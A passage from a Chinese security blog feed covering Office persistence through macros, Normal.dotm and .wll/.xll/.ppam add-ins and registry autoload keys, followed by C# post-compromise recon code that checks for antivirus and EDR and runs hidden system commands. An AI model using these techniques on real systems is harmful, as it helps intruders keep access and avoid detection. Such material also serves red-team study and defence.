相关判断</h2><ul><li><p><code>VBAWarnings</code> 键值数值数据说明</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">1:启用所有宏</span></span><br><span class="line"><span class="section">2:禁用所有宏并发出通知</span></span><br><span class="line"><span class="section">3:禁用无数字部署的所有宏</span></span><br><span class="line"><span class="section">4:禁用所有宏并且不通知</span></span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过注册表检测 Office 是否开启宏</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">OfficeVBAWarnings</span>(<span class="params"><span class="keyword">string</span> OfficeVersion</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            List&lt;<span class="keyword">string</span>&gt; OfficeFeatures = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;()</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"Excel"</span>, <span class="string">"Word"</span>, <span class="string">"PowerPoint"</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">string</span> Features <span class="keyword">in</span> OfficeFeatures)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> basekey = <span class="string">@"SOFTWARE\Microsoft\Office\"</span> + OfficeVersion + <span class="string">@"\"</span> + Features + <span class="string">@"\Security"</span>;</span><br><span class="line">                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(basekey);</span><br><span class="line">                <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span>[] ValueNames = registryKey.GetValueNames();</span><br><span class="line">                    <span class="keyword">if</span> (registryKey.ValueCount == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(<span class="string">"  [&gt;] &#123;0&#125; VBAWarnings: 2"</span>, Features);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">foreach</span> (<span class="keyword">string</span> KeyName <span class="keyword">in</span> ValueNames)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">object</span> VBAWarnings = registryKey.GetValue(<span class="string">"VBAWarnings"</span>);</span><br><span class="line">                            Console.WriteLine(<span class="string">"  [&gt;] &#123;0&#125; VBAWarnings: &#123;1&#125;"</span>, Features, VBAWarnings);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过注册表检测 Office 版本</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">OfficeIsInstall</span>(<span class="params"><span class="keyword">string</span> OfficeVersion</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">string</span> basekey = <span class="string">@"SOFTWARE\Microsoft\Office\"</span> + OfficeVersion + <span class="string">@"\Common\InstallRoot"</span>;</span><br><span class="line">            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey);</span><br><span class="line">            <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (registryKey.GetValue(<span class="string">"Path"</span>) != <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"  [&gt;] Microsoft Office Version: &#123;0&#125;"</span>, OfficeVersion);</span><br><span class="line">                    OfficeVBAWarnings(OfficeVersion);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            List&lt;<span class="keyword">string</span>&gt; OfficeVersions = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;()</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"8.0"</span>, <span class="string">"9.0"</span>, <span class="string">"10.0"</span>, <span class="string">"11.0"</span>, <span class="string">"12.0"</span>, <span class="string">"14.0"</span>, <span class="string">"15.0"</span>, <span class="string">"16.0"</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">string</span> OfficeVersion <span class="keyword">in</span> OfficeVersions)</span><br><span class="line">            &#123;</span><br><span class="line">                OfficeIsInstall(OfficeVersion);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x03-Office-模板宏"><a href="#0x03-Office-模板宏" class="headerlink" title="0x03 Office 模板宏"></a>0x03 Office 模板宏</h2><p>每次 <code>Office</code> 程序启动时都会加载使用 <code>Office</code> 程序中的基本模板。</p><p><em>相关位置</em></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Word Normal.dotm位置：</span><br><span class="line">C:<span class="symbol">\U</span>sers(username)<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\T</span>emplates<span class="symbol">\N</span>ormal.dotm</span><br><span class="line"></span><br><span class="line">Excel Personal.xlsb位置：C:<span class="symbol">\U</span>sers(username)<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\E</span>xcel<span class="symbol">\X</span>LSTART<span class="symbol">\P</span>ERSONAL.XLSB</span><br></pre></td></tr></table></figure><p><em>这一部分在倾旋的博客有提到</em></p><p>新建宏名字 –&gt; <code>word</code> 为<em>AutoOpen</em>， <code>Excel</code> 为<em>Auto_Open</em></p><p>使用 <code>GIF</code> 进行演示（Excel 同理）</p><p><img src="/image/【权限维持】Microsoft Office/Blog_2019-05-27_22-32-49.gif" alt="Blog_2019-05-27_22-32-49.png"></p><p>本地使用相对应的 <code>Office</code> 版本生成的全局宏，替换目标机器对应的 <code>Office</code> 版本的全局宏，可行。</p><h2 id="0x04-Office-加载项"><a href="#0x04-Office-加载项" class="headerlink" title="0x04 Office  加载项"></a>0x04 Office  加载项</h2><p><code>Office</code> 中支持不同类型的加载项，从本质上来讲，<code>Office</code> 套装有很多受信任的位置，当放置库文件时，在打开 <code>Office</code> 程序时，会自动加载库文件。在 <code>Office</code> 的信任中心选择禁用加载项，实际上不会禁用WLL，也不会阻止VBA代码执行。</p><h3 id="1）Word-的-WLL-加载项"><a href="#1）Word-的-WLL-加载项" class="headerlink" title="1）Word 的 WLL 加载项"></a>1）Word 的 WLL 加载项</h3><p><code>Word</code> 的三个默认加载项位置如下所示：</p><p><img src="/image/【权限维持】Microsoft Office/Blog_2019-05-27_22-32-49.png" alt="Blog_2019-05-27_22-32-49.png"></p><p>对用户位置中的 <code>Startup</code> 进一步调查发现，它是 Word 默认存放<code>全局模板</code>和<code>加载项</code>的文件夹，当启动Word时，程序会自动加载 <code>Startup</code> 文件夹中所有<code>*.dot、*.dotx或*.dotm</code>格式的Word文件，也可以托管拓展名为 <code>* .wll</code> 的文件。而<code>* .wll</code> 文件本质上是一个带有额外<code>特定于Office的扩展的DLL</code>。这意味着<code>* .wll</code> 文件起码可以实现基本的 <code>DLL 功能</code>，我们只需要将<code>*.dll</code> 重命名为 <code>*.wll</code>，放入此文件夹中，可获取当前<code>启动 word 的用户</code>的执行权限。</p><p><em>示例</em>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(<span class="string">"calc"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">Run();</span><br><span class="line"><span class="comment">// MessageBox(NULL, L"Hello World，I'm RcoIl", L"demo", MB_OK);</span></span><br><span class="line"><span class="comment">// WinExec("calc.exe", SW_SHOWNORMAL);</span></span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这步骤出现了无法加载 <code>wll</code> 问题，所以我直接提问 <a href="https://www.twitter.com/domchell" target="_blank" rel="noopener">Dominic Chell.</a>，他给我的回答是：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我在测试的时候也遇到了这样的问题，我认为它是使用了 UI 来弹出东西的，所以建议使用一个简单的 MessageBox 进行测试。并且确保是从 <span class="built_in">attach</span> 当中调用 Run()。</span><br><span class="line"></span><br><span class="line">在使用 MessageBox 时，确保没有使用任何有关系统的东西（避免缺失 DLL），并尝试所有的<span class="built_in">switch</span> cases</span><br></pre></td></tr></table></figure><p>exp 思路就不说了。</p><p>所以我最后使用了上面代码注释行。成功，结果如下。</p><p><img src="/image/【权限维持】Microsoft Office/Blog_2019-05-27_22-32-50.gif" alt="Blog_2019-05-27_22-32-50.gif"></p><h3 id="2）Excel-的-XLL-加载项"><a href="#2）Excel-的-XLL-加载项" class="headerlink" title="2）Excel 的 XLL 加载项"></a>2）Excel 的 XLL 加载项</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>2.0<span class="symbol">\E</span>xcel<span class="symbol">\O</span>ptions注册表项中添加一个键值</span><br><span class="line">OPEN /R DemoAddin.xll （字符串值）</span><br></pre></td></tr></table></figure><p><code>Excel</code> 启动时，会自动检索 <code>C:\Users(username)\AppData\Roaming\Microsoft\AddIns</code>目录，所以不需要写入绝对路径，默认自动加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// DemoAddin.xll EXPORTS is xlAutoOpen</span><br></pre></td></tr></table></figure><h3 id="3）PowerPoint-的-VBA-加载项"><a href="#3）PowerPoint-的-VBA-加载项" class="headerlink" title="3）PowerPoint 的 VBA 加载项"></a>3）PowerPoint 的 VBA 加载项</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>2.0<span class="symbol">\P</span>owerPoint<span class="symbol">\A</span>ddIns<span class="symbol">\&lt;</span>AddInName&gt;</span><br></pre></td></tr></table></figure><p>文件格式为 <code>*.ppam</code> 或 <code>*.ppa</code>，也是与Excel 一样，放入<code>AddIns</code> 目录中。设置 <code>Autoload</code> 键值为 <strong>1</strong> ，更改PowerPoint 启动时自动加载加载项。</p><p><img src="/image/【权限维持】Microsoft Office/Blog_2019-05-28_12-32-49.png" alt="Blog_2019-05-28_12-32-49"></p><p>关于<code>wll(DLL)</code> 、 <code>xll(dll)</code> 和 <code>ppam(VBA)</code> 的利用，可自行研究。</p><h3 id="4）更多"><a href="#4）更多" class="headerlink" title="4）更多"></a>4）更多</h3><p>更多内容请阅读文章底部的参考文章。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://attack.mitre.org/techniques/T1137/" target="_blank" rel="noopener">Office Application Startup</a><br><a href="https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/" target="_blank" rel="noopener">MAINTAINING ACCESS WITH NORMAL.DOTM</a><br><a href="http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/" target="_blank" rel="noopener"><a href="http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/" target="_blank" rel="noopener">Beyond good ol’ Run key, Part 62</a></a><br><a href="https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/" target="_blank" rel="noopener">Add-In Opportunities for Office Persistence</a><br><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/" target="_blank" rel="noopener">Persistence: “the continued or prolonged existence of something”: Part 1 – Microsoft Office</a><br><a href="https://github.com/outflanknl/EvilClippy" target="_blank" rel="noopener">EvilClippy</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是针对&lt;a href=&quot;https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows常见持久控制&lt;/a&gt;的第一次说明。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>【编程】通过编程实现的本地机器信息收集</title>
    <link href="https://rcoil.me/2019/05/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91%E9%80%9A%E8%BF%87%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://rcoil.me/2019/05/【编程】通过编程实现的本地机器信息收集/</id>
    <published>2019-05-11T10:52:59.000Z</published>
    <updated>2019-10-31T16:09:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>可选用 <code>bat</code>、<code>C++</code>、<code>C#</code> 进行编写程序，前两者运行无条件限制，后者需要判断 <code>.NET</code> 版本，由于一直是对 <code>C#</code> 较感兴趣，所以使用后者进行编写，也可以直接使用 <code>execute-assembly</code> 执行。</p><p>本文多数模块取之文末的 <code>github</code> 项目，本项目地址 - <a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpGetBasisDown" target="_blank" rel="noopener">SharpGetBasisDown</a>。</p><h2 id="0x01-信息收集模块"><a href="#0x01-信息收集模块" class="headerlink" title="0x01 信息收集模块"></a>0x01 信息收集模块</h2><h3 id="1）安全产品检测"><a href="#1）安全产品检测" class="headerlink" title="1）安全产品检测"></a>1）安全产品检测</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">AV_EDR</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**- 获取进程信息</span></span><br><span class="line"><span class="comment">             * - 枚举杀软进程列表（自定义列表）</span></span><br><span class="line"><span class="comment">             * - 存在则输出</span></span><br><span class="line"><span class="comment">             * - 代码实现</span></span><br><span class="line"><span class="comment">             * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">           <span class="keyword">string</span>[] avproducts = &#123; <span class="string">"Skynet"</span>,...., <span class="string">"GDScan"</span> &#125;;</span><br><span class="line">            Process[] proces = Process.GetProcesses(Environment.MachineName);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Enumerating EDR products and Antivirus Processes on "</span> + Environment.MachineName + <span class="string">"..."</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Loaded "</span> + avproducts.Length + <span class="string">" AV Process Names"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; proces.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; avproducts.Length; a++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span> processSearch = avproducts[a];</span><br><span class="line">                    <span class="keyword">if</span> (proces[i].ProcessName.Equals(processSearch))</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(<span class="string">"\t[!] Found AV Process: "</span> + proces[i].ProcessName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/**- 枚举列表（自定义列表）</span></span><br><span class="line"><span class="comment">             * - 使用 File.Exists 检测文件是否存在</span></span><br><span class="line"><span class="comment">             * - 存在则输出</span></span><br><span class="line"><span class="comment">             * - 代码实现</span></span><br><span class="line"><span class="comment">             * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="keyword">string</span>[] edrproducts = &#123; <span class="string">"CiscoAMPCEFWDriver.sys"</span>,...., <span class="string">"amm6460.sys"</span> &#125;;</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Loaded "</span> + edrproducts.Length + <span class="string">" EDR Product Names"</span>);</span><br><span class="line">            <span class="keyword">string</span> edrPath = <span class="string">@"C:\Windows\System32\drivers\"</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> e = <span class="number">0</span>; e &lt; edrproducts.Length; e++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (File.Exists(edrPath + edrproducts[e]))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"\t[!] EDR driver found "</span> + edrproducts[e]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="2）计算机架构"><a href="#2）计算机架构" class="headerlink" title="2）计算机架构"></a>2）计算机架构</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Mains()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 直接使用 Environment</span></span><br><span class="line"><span class="comment">             * - 参考：https://docs.microsoft.com/en-us/dotnet/api/system.environment?view=netframework-4.8</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Environment members "</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前机器名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] MachineName: &#123;0&#125;"</span>, Environment.MachineName);</span><br><span class="line">            <span class="comment">// 当前用户名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] UserName: &#123;0&#125;"</span>, Environment.UserName);</span><br><span class="line">            <span class="comment">// 当前Domain名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] UserDomainName: &#123;0&#125;"</span>, Environment.UserDomainName);</span><br><span class="line">            <span class="comment">// 当前系统版本</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] OSVersion: &#123;0&#125;"</span>, Environment.OSVersion.ToString());</span><br><span class="line">            <span class="comment">// 当前目录</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] CurrentDirectory: &#123;0&#125;"</span>, Environment.CurrentDirectory);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 盘符</span></span><br><span class="line">            <span class="keyword">string</span>[] drives = Environment.GetLogicalDrives();</span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] GetLogicalDrives: &#123;0&#125;"</span>, <span class="keyword">String</span>.Join(<span class="string">", "</span>, drives));</span><br><span class="line">            <span class="comment">// 当前程序名</span></span><br><span class="line">            <span class="keyword">string</span>[] arguments = Environment.GetCommandLineArgs();</span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] GetCommandLineArgs: &#123;0&#125;"</span>, <span class="keyword">String</span>.Join(<span class="string">", "</span>, arguments));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="3-文件遍历"><a href="#3-文件遍历" class="headerlink" title="3) 文件遍历"></a>3) 文件遍历</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接利用bat执行就可以</span><br><span class="line"><span class="keyword">FOR</span> /F <span class="string">"Skip=1"</span> %<span class="built_in">%I</span> in ('wmic logicaldisk where <span class="string">"Size&lt;&gt;null"</span> get name') <span class="keyword">Do</span> (%<span class="built_in">%I</span> &amp;&amp; dir /<span class="keyword">s</span> /a %<span class="built_in">%I</span>)</span><br></pre></td></tr></table></figure><h3 id="4-执行命令获取相关"><a href="#4-执行命令获取相关" class="headerlink" title="4) 执行命令获取相关"></a>4) 执行命令获取相关</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 运行基础命令查询</span></span><br><span class="line">        public static void GetBasisInfo()</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 获取系统基础信息</span></span><br><span class="line"><span class="comment">            * - 管道没找到好的利用方式</span></span><br><span class="line"><span class="comment">            * - 直接加载系统库，使用 system,此方法有个缺点，需要预分配内存，部分命令无法运行</span></span><br><span class="line"><span class="comment">            * - 最后选择 ProcessStartInfo</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">string</span>[] commands = &#123;</span><br><span class="line">                <span class="string">"systeminfo"</span>,</span><br><span class="line">                <span class="string">"netstat -anop tcp"</span>,</span><br><span class="line">                <span class="string">"ipconfig /all"</span>,</span><br><span class="line">                <span class="string">"tasklist /v"</span>,</span><br><span class="line">                <span class="string">"set"</span>,</span><br><span class="line">                <span class="string">"query user"</span>,</span><br><span class="line">                <span class="string">"net share"</span>,</span><br><span class="line">                <span class="comment">// 自启动的程序</span></span><br><span class="line">                <span class="string">"wmic startup list full"</span>,</span><br><span class="line">                <span class="comment">// 查看分区</span></span><br><span class="line">                <span class="string">"wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size"</span>,</span><br><span class="line">                <span class="comment">// 判断 .NET 版本</span></span><br><span class="line">                <span class="string">"dir %WINDIR%\\Microsoft.NET\\Framework\\v*"</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            foreach (<span class="keyword">string</span> command in commands)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> FileName = command.Replace(<span class="string">"/"</span>, <span class="string">""</span>).Replace(<span class="string">"-"</span>, <span class="string">""</span>).Replace(<span class="string">"+"</span>, <span class="string">""</span>).Replace(<span class="string">"%"</span>, <span class="string">""</span>).Replace(<span class="string">","</span>, <span class="string">""</span>).Replace(<span class="string">"="</span>, <span class="string">""</span>).Replace(<span class="string">"*"</span>, <span class="string">""</span>).Replace(<span class="string">"\\"</span>, <span class="string">""</span>);</span><br><span class="line">                ProcessStartInfo proccessStartInfo = <span class="keyword">new</span> ProcessStartInfo(<span class="string">"cmd.exe"</span>, <span class="string">" /c "</span> + command);</span><br><span class="line">                proccessStartInfo.CreateNoWindow = true;</span><br><span class="line">                Process <span class="function"><span class="keyword">proc</span> = <span class="title">new</span> <span class="title">Process</span> &#123; <span class="title">StartInfo</span> = <span class="title">proccessStartInfo</span> &#125;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">StartInfo</span>.<span class="title">RedirectStandardOutput</span> = <span class="title">true</span></span>; <span class="comment">// 由调用程序获取输出信息</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span 